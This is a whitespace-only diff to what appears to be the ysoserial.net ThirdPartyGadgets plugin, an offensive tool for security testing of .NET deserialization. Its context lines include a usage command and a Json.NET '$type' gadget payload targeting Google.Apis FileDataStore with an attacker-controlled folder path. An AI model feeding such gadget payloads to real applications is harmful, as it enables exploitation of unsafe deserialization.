@@ -147,7 +147,7 @@ Gadgets:
         Tested Version: 1.62.1
         [Finders: Piotr Bazydlo]
 
-Exemplary usage: 
+Exemplary usage:
 
     ysoserial.exe -p ThirdPartyGadgets -l
 
@@ -167,7 +167,7 @@ Exemplary usage:
         {
 
             String gadget = "";
-            
+
             if (formatter.ToLower() == "json.net")
             {
                 gadget = @"
@@ -361,7 +361,7 @@ Exemplary usage:
                 Console.WriteLine("Provided file " + input + " does not exist");
                 Environment.Exit(-1);
             }
-            
+
             String gadget = "";
 
 
@@ -450,7 +450,7 @@ Exemplary usage:
             {
                 gadget = @"
 {
-    '$type':'Google.Apis.Util.Store.FileDataStore, Google.Apis, Version=1.62.1.0, Culture=neutral, PublicKeyToken=4b01fa6e34db77ab', 
+    '$type':'Google.Apis.Util.Store.FileDataStore, Google.Apis, Version=1.62.1.0, Culture=neutral, PublicKeyToken=4b01fa6e34db77ab',
     'folder':'" + input + @"',
     'fullPath':'true'
 }
